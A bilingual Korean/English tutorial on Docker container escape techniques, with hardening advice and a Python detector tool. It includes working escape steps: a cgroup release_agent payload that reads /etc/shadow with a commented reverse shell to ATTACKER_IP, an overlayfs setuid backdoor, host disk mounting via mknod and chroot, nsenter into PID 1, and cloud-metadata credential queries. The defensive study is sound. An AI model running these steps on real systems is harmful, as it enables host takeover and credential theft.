            if only_detected and f.severity == "INFO":
                continue
            color_prefix = {
                "CRITICAL": "[CRITICAL]",
                "HIGH":     "[HIGH    ]",
                "MEDIUM":   "[MEDIUM  ]",
                "LOW":      "[LOW     ]",
                "INFO":     "[INFO    ]",
            }.get(f.severity, "[UNKNOWN ]")

            print(f"\n{color_prefix} {f.name}")
            print(f"  카테고리  : {f.category}")
            print(f"  설명      : {f.description}")
            if f.evidence:
                print(f"  증거      : {f.evidence[:120]}")
            if f.exploit_hint:
                print(f"  익스플로잇: {f.exploit_hint[:120]}")

    if not only_detected and not_detected:
        print(f"\n{'─'*70}")
        print(f"정상 항목 ({len(not_detected)}개)")
        for f in not_detected:
            if f.severity != "INFO":
                continue
            print(f"  [OK] {f.name}")

    # 요약
    critical = sum(1 for f in detected if f.severity == "CRITICAL")
    high = sum(1 for f in detected if f.severity == "HIGH")
    medium = sum(1 for f in detected if f.severity == "MEDIUM")
    print(f"\n{'='*70}")
    print(f"[요약] 총 {len(findings)}개 검사 | "
          f"CRITICAL:{critical} HIGH:{high} MEDIUM:{medium} | "
          f"탈출 가능성: {'높음' if critical > 0 else '보통' if high > 0 else '낮음'}")


# ── CLI 커맨드 핸들러 ─────────────────────────────────────────────────────────

def cmd_check_all(args: argparse.Namespace) -> None:
    print("[*] 컨테이너 탈출 벡터 종합 탐지 시작...\n")
    findings = run_all_checks(verbose=args.verbose)
    print_findings(findings, only_detected=args.only_detected)
    if args.output:
        data = [asdict(f) for f in findings]
        Path(args.output).write_text(json.dumps(data, indent=2, ensure_ascii=False))
        print(f"\n[+] 결과 저장: {args.output}")


def cmd_check_caps(args: argparse.Namespace) -> None:
    print("[*] 캐퍼빌리티 검사\n")
    caps = get_process_capabilities()
    cap_eff = caps.get("CapEff", 0)
    cap_prm = caps.get("CapPrm", 0)

    decoded = decode_capabilities(cap_eff)
    print(f"CapEff: {cap_eff:#018x}")
    print(f"CapPrm: {cap_prm:#018x}\n")

    if not decoded:
        print("[+] 유효한 캐퍼빌리티 없음")
        return

    for cap in sorted(decoded, key=lambda c: c.severity):
        print(f"  [{cap.severity:8s}] {cap.cap_name:30s} - {cap.description}")


def cmd_check_namespaces(args: argparse.Namespace) -> None:
    print("[*] 네임스페이스 격리 검사\n")
    findings = check_namespaces()
    print_findings(findings, only_detected=False)


def cmd_check_cgroups(args: argparse.Namespace) -> None:
    print("[*] cgroup 보안 검사\n")
    findings = check_cgroups()
    print_findings(findings, only_detected=False)


def cmd_check_mounts(args: argparse.Namespace) -> None:
    print("[*] 마운트 포인트 보안 검사\n")
    findings = check_mounts()
    print_findings(findings, only_detected=False)


def cmd_check_kernel(args: argparse.Namespace) -> None:
    print("[*] 커널 취약점 검사\n")
    findings = check_kernel_version()
    print_findings(findings, only_detected=False)


def cmd_report(args: argparse.Namespace) -> None:
    """전체 보고서 생성"""
    print("[*] 전체 보안 보고서 생성 중...\n")
    findings = run_all_checks(verbose=True)

    report = {
        "system": {
            "hostname": socket.gethostname(),
            "kernel": platform.release(),
            "arch": platform.machine(),
            "pid": os.getpid(),
        },
        "summary": {
            "total_checks": len(findings),
            "critical": sum(1 for f in findings if f.detected and f.severity == "CRITICAL"),
            "high": sum(1 for f in findings if f.detected and f.severity == "HIGH"),
            "medium": sum(1 for f in findings if f.detected and f.severity == "MEDIUM"),
            "low": sum(1 for f in findings if f.detected and f.severity == "LOW"),
        },
        "findings": [asdict(f) for f in findings],
    }

    print_findings(findings, only_detected=False)

    output = args.output or "container_escape_report.json"
    Path(output).write_text(json.dumps(report, indent=2, ensure_ascii=False))
    print(f"\n[+] 보고서 저장: {output}")


# ── argparse ──────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="container_escape_detector",
        description="컨테이너 탈출 취약점 자동 탐지기",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  %(prog)s check-all
  %(prog)s check-all --only-detected --output findings.json
  %(prog)s check-caps
  %(prog)s check-namespaces
  %(prog)s check-cgroups
  %(prog)s check-mounts
  %(prog)s check-kernel
  %(prog)s report --output report.json
        """
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # check-all
    p_all = sub.add_parser("check-all", help="모든 탈출 벡터 종합 검사")
    p_all.add_argument("--only-detected", action="store_true", help="탐지된 항목만 출력")
    p_all.add_argument("--verbose", action="store_true", help="상세 출력")
    p_all.add_argument("--output", "-o", help="결과 저장 파일(JSON)")

    # 개별 검사
    sub.add_parser("check-caps", help="캐퍼빌리티 검사")
    sub.add_parser("check-namespaces", help="네임스페이스 격리 검사")
    sub.add_parser("check-cgroups", help="cgroup 보안 검사")
    sub.add_parser("check-mounts", help="마운트 포인트 검사")
    sub.add_parser("check-kernel", help="커널 취약점 검사")

    # report
    p_rep = sub.add_parser("report", help="전체 보안 보고서 생성")
    p_rep.add_argument("--output", "-o", default="container_escape_report.json")

    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    dispatch = {
        "check-all": cmd_check_all,
        "check-caps": cmd_check_caps,
        "check-namespaces": cmd_check_namespaces,
        "check-cgroups": cmd_check_cgroups,
        "check-mounts": cmd_check_mounts,
        "check-kernel": cmd_check_kernel,
        "report": cmd_report,
    }

    handler = dispatch.get(args.command)
    if handler:
        handler(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

---

## 9. 탈출 기법 비교 요약

| 기법 | 전제조건 | 성공률 | 탐지 난이도 |
|------|----------|--------|-------------|
| Privileged + cgroup release_agent | `--privileged` | 매우 높음 | 낮음 |
| Docker socket 마운트 | docker.sock 마운트 | 매우 높음 | 낮음 |
| CVE-2019-5736 (runc overwrite) | runc < 1.0-rc7 | 높음 | 보통 |
| CAP_SYS_ADMIN + cgroupv1 | CAP_SYS_ADMIN | 높음 | 보통 |
| CVE-2022-0492 | < 5.17 커널, cgroupv1 | 보통 | 높음 |
| hostPID + nsenter | `--pid=host` | 높음 | 낮음 |
| overlayfs CVE-2021-3493 | Ubuntu < 5.11.0-25 | 보통 | 높음 |
| userspace runc 경쟁조건 | runc 실행 트리거 가능 | 낮음 | 매우 높음 |

---

## 10. 방어 심화

```bash
# 1. gVisor (runsc) 사용 - 시스템 콜 인터셉트
docker run --runtime=runsc nginx

# 2. Kata Containers - VM 수준 격리
docker run --runtime=kata nginx

# 3. Seccomp 커스텀 프로파일 생성
cat > /etc/docker/seccomp-strict.json << 'EOF'
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {"names": ["read","write","open","close","stat","exit","exit_group",
               "brk","mmap","munmap","access","execve","nanosleep"],
     "action": "SCMP_ACT_ALLOW"}
  ]
}
EOF
docker run --security-opt seccomp=/etc/docker/seccomp-strict.json nginx

# 4. AppArmor 프로파일 적용
aa-genprof /usr/bin/myapp
docker run --security-opt apparmor=myapp-profile nginx

# 5. cgroupv2 전환 (release_agent 취약점 해소)
# /etc/default/grub: GRUB_CMDLINE_LINUX="systemd.unified_cgroup_hierarchy=1"
update-grub && reboot

# 6. 읽기 전용 루트 + tmpfs 조합
docker run \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid \
  --tmpfs /run:rw,noexec,nosuid \
  nginx
```

---

<a name="english"></a>

# Container Escape In Depth: Kernel Vulnerabilities and Namespace Escapes

## 1. Deep Dive into Container Isolation Mechanisms

Docker/Kubernetes containers implement isolation by combining the following Linux kernel features.

```
Isolation Mechanisms
├── Namespaces (scope restriction)
│   ├── mnt  → filesystem mount points
│   ├── pid  → process ID space
│   ├── net  → network interfaces/routing
│   ├── ipc  → IPC objects
│   ├── uts  → hostname/domain name
│   ├── user → UID/GID mapping
│   └── cgroup → cgroup root
│
├── cgroups (resource limits)
│   ├── cpu / memory / io
│   └── devices (allowed device access)
│
├── Capabilities (root privilege granularization)
│   ├── CAP_SYS_ADMIN (most dangerous)
│   ├── CAP_NET_ADMIN
│   └── ...38 capabilities total
│
├── Seccomp (syscall filtering)
│   └── Docker default: ~44 of ~300 blocked
│
└── AppArmor / SELinux (mandatory access control)
```

---

## 2. runc Vulnerability: CVE-2019-5736 (Runc Overwrite)

### Vulnerability Overview

In runc versions 1.0-rc6 and below, an attacker inside a container can overwrite the host's runc binary via `/proc/self/exe`.

```
Attack flow:
Attacker inside container
    ↓ /proc/self/exe → symbolic link to host runc binary
    ↓ triggered by runc exec or runc run
    ↓ write race while fd is open
    → overwrite host runc binary → arbitrary code execution on next runc invocation
```

```bash
# Check affected version
runc --version
# runc version 1.0.0-rc5 or below → vulnerable

# PoC concept (actual exploit requires timing race condition)
# From inside the container:
cat /proc/self/exe | file -  # verify current runc binary
ls -la /proc/self/fd/        # check open file descriptors

# CVE-2019-5736 PoC reference (conceptual)
# 1. Create symbolic link pointing to /proc/self/exe
# 2. Re-execute self via execve while keeping fd open
# 3. When runc opens /proc/<pid>/exe during container process initialization
# 4. Win race condition, reopen with O_WRONLY
# 5. Write malicious payload
```

```bash
# Defense: upgrade to latest runc
apt-get install --only-upgrade runc containerd
runc --version  # verify 1.1.x or higher

# Or use gVisor/Kata Containers (hypervisor-based isolation)
```

---

## 3. Abusing CAP_SYS_ADMIN

### 3.1 cgroupv1 notify_on_release Escape

The most well-known technique for executing host code using `CAP_SYS_ADMIN` + cgroupv1.

```bash
# Check prerequisites
cat /proc/self/cgroup | head -5
ls /sys/fs/cgroup/
# cgroupv1: separate mounts at /sys/fs/cgroup/memory, /sys/fs/cgroup/cpu, etc.
# cgroupv2: single unified mount at /sys/fs/cgroup/unified

# ── Full cgroupv1 escape procedure ──────────────────────────────────────────

# 1. Mount rdma (or another) cgroup subsystem
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp

# If rdma is unavailable:
mount -t cgroup -o memory cgroup /tmp/cgrp

# 2. Create a child cgroup
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Determine the container's overlayfs path on the host
host_path=$(cat /etc/mtab | grep overlay | grep -oP 'upperdir=\K[^,]+')
# Or:
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)
echo "Host path: $host_path"

# 4. Set release_agent (path to be executed on the host)
echo "$host_path/escape_payload" > /tmp/cgrp/release_agent

# 5. Write payload script (written to host_path from inside the container)
cat > /escape_payload << 'EOF'
#!/bin/sh
id > /escape_output
hostname >> /escape_output
cat /etc/shadow >> /escape_output
# Reverse shell:
# bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /escape_payload

# 6. Terminate a process in the cgroup to trigger notify_on_release
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 7. Check results (after a moment)
sleep 1
cat /escape_output   # output from command executed on host
```

### 3.2 Filesystem Escape via CAP_SYS_ADMIN + Mount

```bash
# Mount tmpfs then access host files via overlayfs
mkdir /tmp/lower /tmp/upper /tmp/work /tmp/merged

# overlayfs mount (requires CAP_SYS_ADMIN)
mount -t overlay overlay \
  -o lowerdir=/tmp/lower,upperdir=/tmp/upper,workdir=/tmp/work \
  /tmp/merged

# Bypass restrictions by remounting procfs
mount -t proc proc /proc  # new proc mount

# Access devices via sysfs
ls /sys/block/  # list host block devices
```

---

## 4. OverlayFS Vulnerabilities

### CVE-2021-3493 (Ubuntu OverlayFS Privilege Escalation)

```bash
# Check vulnerable kernel versions
uname -r
# Ubuntu 5.11.0-25 or below, 5.8.0-63 or below → vulnerable

# Concept: user namespace + overlayfs combination allows setuid file creation
# Create setuid file in overlayfs upper dir → setuid preserved on host when merged

# PoC concept
unshare -Urm  # unshare user namespace + mount namespace
# Inside:
mkdir -p /tmp/ol/{lower,upper,work,merged}
mount -t overlay overlay \
  -o lowerdir=/tmp/ol/lower,upperdir=/tmp/ol/upper,workdir=/tmp/ol/work \
  /tmp/ol/merged

# Create setuid binary
cp /bin/bash /tmp/ol/merged/backdoor
chmod +s /tmp/ol/merged/backdoor

# Executing outside user namespace preserves setuid
/tmp/ol/upper/backdoor -p  # effective uid = 0
```

### CVE-2023-0386 (OverlayFS NOSUID bypass)

```bash
# Affected scope: before Linux 6.1.x
# Create setuid file in overlayfs upper dir within user namespace;
# SUID bit is preserved when executing from host namespace

# Detection
grep "overlay" /proc/mounts
ls -la /proc/self/ns/user  # check user namespace ID
```

---

## 5. cgroupv1 devices.list Escape

```bash
# Check allowed devices via cgroup devices controller
cat /sys/fs/cgroup/devices/devices.list

# If block device access is permitted:
# a *:* rwm → all devices accessible (privileged)

# Create host device node with mknod
mknod /tmp/host_disk b 8 1  # /dev/sda1
mount /tmp/host_disk /mnt/host
chroot /mnt/host /bin/bash
```

---

## 6. Namespace Escape Techniques

### 6.1 Privilege Mapping via User Namespace

```bash
# Create user namespace (available to non-root users)
unshare --user --pid --mount --fork /bin/bash

# Verify UID 0 inside
id  # uid=0(root) gid=0(root)

# Map host UID via /proc/<pid>/uid_map
echo "0 1000 1" > /proc/self/uid_map
echo "0 1000 1" > /proc/self/gid_map
```

### 6.2 PID Namespace Escape

```bash
# When hostPID=true: nsenter into host process 1 (init)
nsenter -t 1 --mount --uts --ipc --net --pid -- bash

# Access file descriptors of host processes
ls /proc/1/fd
cat /proc/1/root/etc/shadow

# Access host process memory via ptrace
# (requires CAP_SYS_PTRACE)
gdb -p 1
# (gdb) info proc
# (gdb) x/20x 0x... (read memory)
```

### 6.3 Net Namespace Escape

```bash
# Check host network interfaces (hostNetwork=true)
ip link show
ip route show

# Access cloud metadata APIs (AWS, GCP, Azure)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# IMDSv2 (AWS)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 7. Seccomp Bypass

```bash
# Check Docker default seccomp profile
docker inspect <container> | python3 -c "
import json, sys
d = json.load(sys.stdin)
sc = d[0]['HostConfig'].get('SecurityOpt', [])
print('SecurityOpt:', sc)
"

# If seccomp=unconfined → all syscalls allowed
# → ptrace, keyctl, personality etc. unrestricted

# Test whether unshare syscall is permitted
unshare -r /bin/bash
id  # if uid=0 then it is allowed

# Analyze seccomp profile
cat /etc/docker/seccomp-custom.json | python3 -c "
import json, sys
profile = json.load(sys.stdin)
blocked = [s['names'] for s in profile.get('syscalls', []) if s['action'] == 'SCMP_ACT_ERRNO']
print('Blocked syscalls:', blocked)
"
```

---

## 8. Python CLI Tool: Automated Container Vulnerability Detector

```python
#!/usr/bin/env python3
"""
container_escape_detector.py - Automated container escape vulnerability detection CLI

Usage:
  python container_escape_detector.py check-all
  python container_escape_detector.py check-caps
  python container_escape_detector.py check-namespaces
  python container_escape_detector.py check-cgroups
  python container_escape_detector.py check-mounts
  python container_escape_detector.py check-kernel
  python container_escape_detector.py report --output report.json
"""

from __future__ import annotations

import argparse
import ctypes
import json
import os
import platform
import re
import socket
import struct
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any


# ── Linux Capabilities constants ─────────────────────────────────────────────

CAP_DEFINITIONS: dict[int, tuple[str, str]] = {
    0:  ("CAP_CHOWN", "change file ownership"),
    1:  ("CAP_DAC_OVERRIDE", "bypass DAC permissions"),
    2:  ("CAP_DAC_READ_SEARCH", "bypass read/search DAC"),
    3:  ("CAP_FOWNER", "file owner permissions"),
    4:  ("CAP_FSETID", "set SUID/SGID"),
    5:  ("CAP_KILL", "send signals to processes"),
    6:  ("CAP_SETGID", "set GID"),
    7:  ("CAP_SETUID", "set UID"),
    8:  ("CAP_SETPCAP", "manage capabilities"),
    9:  ("CAP_LINUX_IMMUTABLE", "immutable flag"),
    10: ("CAP_NET_BIND_SERVICE", "bind ports below 1024"),
    11: ("CAP_NET_BROADCAST", "network broadcast"),
    12: ("CAP_NET_ADMIN", "network administration"),
    13: ("CAP_NET_RAW", "raw sockets"),
    14: ("CAP_IPC_LOCK", "memory locking"),
    15: ("CAP_IPC_OWNER", "IPC ownership"),
    16: ("CAP_SYS_MODULE", "kernel modules"),
    17: ("CAP_SYS_RAWIO", "raw I/O"),
    18: ("CAP_SYS_CHROOT", "chroot"),
    19: ("CAP_SYS_PTRACE", "ptrace"),
    20: ("CAP_SYS_PACCT", "process accounting"),
    21: ("CAP_SYS_ADMIN", "system administration (most dangerous)"),
    22: ("CAP_SYS_BOOT", "system reboot"),
    23: ("CAP_SYS_NICE", "process priority"),
    24: ("CAP_SYS_RESOURCE", "resource limits"),
    25: ("CAP_SYS_TIME", "system time"),
    26: ("CAP_SYS_TTY_CONFIG", "TTY configuration"),
    27: ("CAP_MKNOD", "create device files"),
    28: ("CAP_LEASE", "file leasing"),
    29: ("CAP_AUDIT_WRITE", "audit log writing"),
    30: ("CAP_AUDIT_CONTROL", "audit control"),
    31: ("CAP_SETFCAP", "file capabilities"),
    32: ("CAP_MAC_OVERRIDE", "bypass MAC"),
    33: ("CAP_MAC_ADMIN", "MAC administration"),
    34: ("CAP_SYSLOG", "syslog"),
    35: ("CAP_WAKE_ALARM", "wake alarm"),
    36: ("CAP_BLOCK_SUSPEND", "block suspend"),
    37: ("CAP_AUDIT_READ", "read audit log"),
    38: ("CAP_PERFMON", "performance monitoring"),
    39: ("CAP_BPF", "BPF usage"),
    40: ("CAP_CHECKPOINT_RESTORE", "checkpoint/restore"),
}

# Capabilities directly exploitable for escape
CRITICAL_CAPS = {21, 16, 19, 12, 13, 17, 27}  # SYS_ADMIN, SYS_MODULE, SYS_PTRACE, etc.
HIGH_CAPS = {0, 1, 6, 7, 18, 31}              # CHOWN, DAC_OVERRIDE, SETUID, SETGID, CHROOT, SETFCAP


# ── Data classes ─────────────────────────────────────────────────────────────

@dataclass
class Finding:
    category: str
    name: str
    severity: str        # CRITICAL / HIGH / MEDIUM / LOW / INFO
    detected: bool
    description: str
    evidence: str = ""
    exploit_hint: str = ""


@dataclass
class CapabilityInfo:
    cap_id: int
    cap_name: str
    description: str
    present_in_effective: bool
    present_in_permitted: bool
    present_in_inheritable: bool
    severity: str = "LOW"


@dataclass
class MountInfo:
    device: str
    mount_point: str
    fs_type: str
    options: str
    is_host_path: bool = False
    is_sensitive: bool = False


# ── Detection functions ───────────────────────────────────────────────────────

def get_process_capabilities(pid: int = 0) -> dict[str, int]:
    """Read process capability hex values"""
    status_file = f"/proc/{pid}/status" if pid else "/proc/self/status"
    caps: dict[str, int] = {}
    try:
        with open(status_file) as f:
            for line in f:
                for key in ("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb"):
                    if line.startswith(f"{key}:"):
                        caps[key] = int(line.split()[1], 16)
    except OSError:
        pass
    return caps


def decode_capabilities(cap_hex: int) -> list[CapabilityInfo]:
    """Decode capability hex value into individual capability list"""
    result: list[CapabilityInfo] = []
    for bit, (name, desc) in CAP_DEFINITIONS.items():
        if cap_hex & (1 << bit):
            severity = "CRITICAL" if bit in CRITICAL_CAPS else (
                "HIGH" if bit in HIGH_CAPS else "MEDIUM"
            )
            result.append(CapabilityInfo(
                cap_id=bit,
                cap_name=name,
                description=desc,
                present_in_effective=True,  # simplified
                present_in_permitted=True,
                present_in_inheritable=False,
                severity=severity,
            ))
    return result


def check_capabilities() -> list[Finding]:
    """Check capabilities of the current process"""
    findings: list[Finding] = []
    caps = get_process_capabilities()

    cap_eff = caps.get("CapEff", 0)
    cap_prm = caps.get("CapPrm", 0)
    cap_bnd = caps.get("CapBnd", 0)

    # Check for fully privileged (CapEff = 0x3fffffffff or max)
    max_cap = (1 << 41) - 1
    is_fully_privileged = (cap_eff & max_cap) == max_cap
    findings.append(Finding(
        category="capabilities",
        name="Fully Privileged (--privileged)",
        severity="CRITICAL" if is_fully_privileged else "INFO",
        detected=is_fully_privileged,
        description="Fully privileged container with all capabilities",
        evidence=f"CapEff: {cap_eff:#018x}",
        exploit_hint="cgroup notify_on_release, block device mount, nsenter escape possible"
    ))

    # Individual dangerous capabilities
    for bit in CRITICAL_CAPS | HIGH_CAPS:
        if cap_eff & (1 << bit):
            name, desc = CAP_DEFINITIONS.get(bit, (f"CAP_{bit}", ""))
            severity = "CRITICAL" if bit in CRITICAL_CAPS else "HIGH"
            exploit_hints = {
                21: "cgroup release_agent, mount manipulation → host code execution",
                16: "load kernel modules → rootkits, backdoors",
                19: "ptrace host processes → read/write memory",
                12: "modify iptables rules, network sniffing",
                13: "raw socket sniffing, ARP spoofing",
                17: "direct I/O access → disk read/write",
                27: "mknod to create device files",
                7: "setuid to UID 0",
                6: "setgid to GID 0",
            }
            findings.append(Finding(
                category="capabilities",
                name=name,
                severity=severity,
                detected=True,
                description=desc,
                evidence=f"bit {bit} set in CapEff: {cap_eff:#018x}",
                exploit_hint=exploit_hints.get(bit, "")
            ))

    return findings


def check_namespaces() -> list[Finding]:
    """Check namespace isolation state"""
    findings: list[Finding] = []

    ns_pairs = [
        ("mnt", "Mount namespace", "filesystem isolation"),
        ("pid", "PID namespace", "process isolation"),
        ("net", "Network namespace", "network isolation"),
        ("ipc", "IPC namespace", "IPC isolation"),
        ("uts", "UTS namespace", "hostname isolation"),
        ("user", "User namespace", "UID/GID isolation"),
    ]

    for ns_type, ns_desc, isolation_desc in ns_pairs:
        try:
            self_ns = os.readlink(f"/proc/self/ns/{ns_type}")
            init_ns = os.readlink(f"/proc/1/ns/{ns_type}")
            shared = self_ns == init_ns

            severity_map = {
                "mnt": "HIGH",
                "pid": "HIGH",
                "net": "MEDIUM",
                "user": "LOW",
            }
            severity = severity_map.get(ns_type, "MEDIUM") if shared else "INFO"

            findings.append(Finding(
                category="namespaces",
                name=f"Shared {ns_type.upper()} Namespace",
                severity=severity,
                detected=shared,
                description=f"{ns_desc} shared: no {isolation_desc}",
                evidence=f"self: {self_ns} | init: {init_ns}",
                exploit_hint=f"nsenter -t 1 --{ns_type} -- bash" if shared else ""
            ))
        except OSError:
            pass

    # Check if /proc/1/root is accessible (shared mount namespace)
    try:
        os.listdir("/proc/1/root")
        findings.append(Finding(
            category="namespaces",
            name="/proc/1/root Accessible",
            severity="CRITICAL",
            detected=True,
            description="Direct access to init process root filesystem",
            evidence="/proc/1/root",
            exploit_hint="chroot /proc/1/root or cat /proc/1/root/etc/shadow"
        ))
    except (PermissionError, OSError):
        findings.append(Finding(
            category="namespaces",
            name="/proc/1/root Accessible",
            severity="INFO",
            detected=False,
            description="Access to init root filesystem is blocked (normal)"
        ))

    return findings


def check_cgroups() -> list[Finding]:
    """Check cgroup security configuration"""
    findings: list[Finding] = []

    # Check cgroupv1 vs v2
    cgroup_unified = Path("/sys/fs/cgroup/cgroup.controllers")
    is_cgroupv2 = cgroup_unified.exists()
    findings.append(Finding(
        category="cgroups",
        name=f"cgroup v{'2' if is_cgroupv2 else '1'} in use",
        severity="INFO" if is_cgroupv2 else "MEDIUM",
        detected=True,
        description="cgroupv1 is vulnerable to notify_on_release escape technique",
        evidence="/sys/fs/cgroup/cgroup.controllers" if is_cgroupv2 else "/sys/fs/cgroup/"
    ))

    # Check if release_agent is writable
    release_agents: list[str] = []
    cgroup_base = Path("/sys/fs/cgroup")
    if cgroup_base.exists() and not is_cgroupv2:
        for agent_path in cgroup_base.rglob("release_agent"):
            if os.access(str(agent_path), os.W_OK):
                release_agents.append(str(agent_path))

    findings.append(Finding(
        category="cgroups",
        name="Writable cgroup release_agent",
        severity="CRITICAL" if release_agents else "INFO",
        detected=bool(release_agents),
        description="Write access to cgroupv1 release_agent → arbitrary command execution on host",
        evidence="\n".join(release_agents) if release_agents else "none",
        exploit_hint=(
            "1. mkdir /tmp/x && mount -t cgroup cgroup /tmp/x\n"
            "2. echo 1 > /tmp/x/<subsys>/notify_on_release\n"
            "3. echo <host_path>/payload > /tmp/x/<subsys>/release_agent\n"
            "4. sh -c 'echo $$ > /tmp/x/<subsys>/cgroup.procs'"
        ) if release_agents else ""
    ))

    # Check if devices.allow is writable
    devices_allow_writable: list[str] = []
    for da_path in cgroup_base.rglob("devices.allow"):
        if os.access(str(da_path), os.W_OK):
            devices_allow_writable.append(str(da_path))

    if devices_allow_writable:
        findings.append(Finding(
            category="cgroups",
            name="Writable devices.allow",
            severity="HIGH",
            detected=True,
            description="Write access to devices.allow → can grant new device access",
            evidence="\n".join(devices_allow_writable),
            exploit_hint="echo 'a *:* rwm' > devices.allow → access all devices"
        ))

    # Check current container's devices.list
    current_cgroup_file = Path("/proc/self/cgroup")
    if current_cgroup_file.exists():
        try:
            with open(current_cgroup_file) as f:
                cgroup_content = f.read()
            # Parse devices cgroup path
            for line in cgroup_content.splitlines():
                parts = line.split(":", 2)
                if len(parts) == 3 and "devices" in parts[1]:
                    devices_list = Path(f"/sys/fs/cgroup/devices{parts[2]}/devices.list")
                    if devices_list.exists():
                        content = devices_list.read_text().strip()
                        if content == "a *:* rwm":
                            findings.append(Finding(
                                category="cgroups",
                                name="All Devices Allowed",
                                severity="CRITICAL",
                                detected=True,
                                description="All device access permitted (privileged container)",
                                evidence=f"{devices_list}: {content}",
                                exploit_hint="mknod /tmp/host_disk b 8 1 && mount /tmp/host_disk /mnt"
                            ))
        except OSError:
            pass

    return findings


def check_mounts() -> list[Finding]:
    """Check mount point security"""
    findings: list[Finding] = []
    mounts: list[MountInfo] = []

    sensitive_host_paths = {
        "/": "host root filesystem",
        "/etc": "system configuration directory",
        "/root": "root home directory",
        "/proc": "kernel virtual filesystem",
        "/sys": "sysfs",
        "/var/run/docker.sock": "Docker daemon socket",
        "/run/docker.sock": "Docker daemon socket",
        "/var/run/containerd": "containerd socket",
        "/run/containerd": "containerd socket",
        "/home": "user home directories",
        "/var/lib/kubelet": "kubelet data",
        "/etc/kubernetes": "Kubernetes configuration",
    }

    try:
        with open("/proc/mounts") as f:
            for line in f:
                parts = line.split()
                if len(parts) < 4:
                    continue
                device, mount_point, fs_type, options = parts[0], parts[1], parts[2], parts[3]
                is_sensitive = False
                for path, desc in sensitive_host_paths.items():
                    # bind mount: device looks like a host path
                    if device.startswith("/") and device in sensitive_host_paths:
                        is_sensitive = True
                    if mount_point == path or device == path:
                        is_sensitive = True

                is_host_path = device.startswith("/") and not device.startswith("/dev")
                mounts.append(MountInfo(
                    device=device,
                    mount_point=mount_point,
                    fs_type=fs_type,
                    options=options,
                    is_host_path=is_host_path,
                    is_sensitive=is_sensitive,
                ))
    except OSError:
        pass

    # Docker socket mount
    docker_sock_mounted = any(
        m.device in ("/var/run/docker.sock", "/run/docker.sock") or
        m.mount_point in ("/var/run/docker.sock", "/run/docker.sock")
        for m in mounts
    )
    findings.append(Finding(
        category="mounts",
        name="Docker Socket Mounted",
        severity="CRITICAL" if docker_sock_mounted else "INFO",
        detected=docker_sock_mounted,
        description="Docker socket mounted inside container → full host Docker control",
        evidence="/var/run/docker.sock" if docker_sock_mounted else "none",
        exploit_hint="docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it ubuntu chroot /host"
    ))

    # Sensitive host path bind mounts
    host_binds = [m for m in mounts if m.is_sensitive and m.is_host_path]
    for m in host_binds:
        findings.append(Finding(
            category="mounts",
            name=f"Sensitive Host Path: {m.device}",
            severity="HIGH",
            detected=True,
            description=f"Sensitive host path mounted at {m.mount_point}",
            evidence=f"{m.device} → {m.mount_point} ({m.fs_type})"
        ))

    # Check /proc write access
    writable_proc_items = []
    dangerous_proc = [
        "/proc/sysrq-trigger",
        "/proc/sys/kernel/core_pattern",
        "/proc/sys/kernel/modprobe",
    ]
    for proc_path in dangerous_proc:
        if Path(proc_path).exists() and os.access(proc_path, os.W_OK):
            writable_proc_items.append(proc_path)

    if writable_proc_items:
        findings.append(Finding(
            category="mounts",
            name="Writable /proc Entries",
            severity="HIGH",
            detected=True,
            description="Writable /proc entries found",
            evidence="\n".join(writable_proc_items),
            exploit_hint="Write |/path/to/payload to /proc/sys/kernel/core_pattern then trigger coredump"
        ))

    return findings


def check_kernel_version() -> list[Finding]:
    """Check for known vulnerabilities based on kernel version"""
    findings: list[Finding] = []

    try:
        kernel_version = platform.release()
    except Exception:
        kernel_version = "unknown"

    findings.append(Finding(
        category="kernel",
        name="Kernel Version",
        severity="INFO",
        detected=True,
        description=f"Kernel version: {kernel_version}",
        evidence=kernel_version
    ))

    # Known vulnerable version list related to container escapes
    known_vulns: list[tuple[str, str, str, str]] = [
        # (CVE, description, affected version pattern, recommendation)
        ("CVE-2019-5736", "runc /proc/self/exe overwrite", "runc 1.0-rc6 or below", "upgrade to runc 1.0-rc7+"),
        ("CVE-2020-14386", "net/packet UAF → root privilege escalation", "before 5.8", "upgrade to 5.8+"),
        ("CVE-2021-3493", "Ubuntu overlayfs setuid privilege escalation", "5.11.0-25 or below", "apply upstream patch"),
        ("CVE-2022-0492", "cgroup v1 release_agent escape", "before 5.17", "use cgroupv2 or apply patch"),
        ("CVE-2023-0386", "overlayfs NOSUID bypass", "before 6.1", "upgrade to 6.1.12+"),
    ]

    # Check runc version
    try:
        result = subprocess.run(
            ["runc", "--version"], capture_output=True, text=True, timeout=5
        )
        runc_ver = result.stdout.split("\n")[0] if result.returncode == 0 else "unknown"
        findings.append(Finding(
            category="kernel",
            name="runc Version",
            severity="INFO",
            detected=True,
            description=f"runc version: {runc_ver}",
            evidence=runc_ver
        ))
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # Parse kernel version (major.minor.patch)
    version_match = re.match(r"(\d+)\.(\d+)\.(\d+)", kernel_version)
    if version_match:
        major, minor, patch = map(int, version_match.groups())

        # CVE-2022-0492: before 5.17
        if (major < 5) or (major == 5 and minor < 17):
            findings.append(Finding(
